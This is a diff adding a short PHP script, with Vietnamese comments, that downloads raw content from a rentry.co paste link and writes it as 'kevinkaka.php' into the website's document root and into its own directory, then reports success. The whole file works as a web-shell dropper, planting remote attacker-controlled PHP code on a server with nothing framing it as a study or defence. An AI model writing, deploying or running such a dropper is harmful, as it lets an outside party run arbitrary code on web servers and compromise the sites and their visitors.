@@ -1,0 +1,34 @@
+<?php
+// Địa chỉ của file cần đọc
+$rawLink = 'https://rentry.co/p9vcfyht/raw'; // Thay thế bằng URL bạn cần
+
+// Đọc nội dung từ liên kết
+$content = file_get_contents($rawLink);
+
+if ($content === FALSE) {
+    die('Không thể đọc nội dung từ liên kết.');
+}
+
+// Đặt tên file mới
+$newFileName = 'kevinkaka.php';
+
+// Đường dẫn đến thư mục gốc của website
+$rootDir = $_SERVER['DOCUMENT_ROOT'];
+
+// Đường dẫn đến thư mục hiện tại của script
+$currentDir = __DIR__;
+
+// Ghi nội dung vào file trong thư mục gốc
+$rootFilePath = $rootDir . '/' . $newFileName;
+if (file_put_contents($rootFilePath, $content) === FALSE) {
+    die('Không thể ghi nội dung vào thư mục gốc.');
+}
+
+// Ghi nội dung vào file trong thư mục hiện tại
+$currentFilePath = $currentDir . '/' . $newFileName;
+if (file_put_contents($currentFilePath, $content) === FALSE) {
+    die('Không thể ghi nội dung vào thư mục hiện tại.');
+}
+
+echo 'File đã được tạo và ghi vào thư mục gốc và thư mục hiện tại thành công!';
+?>
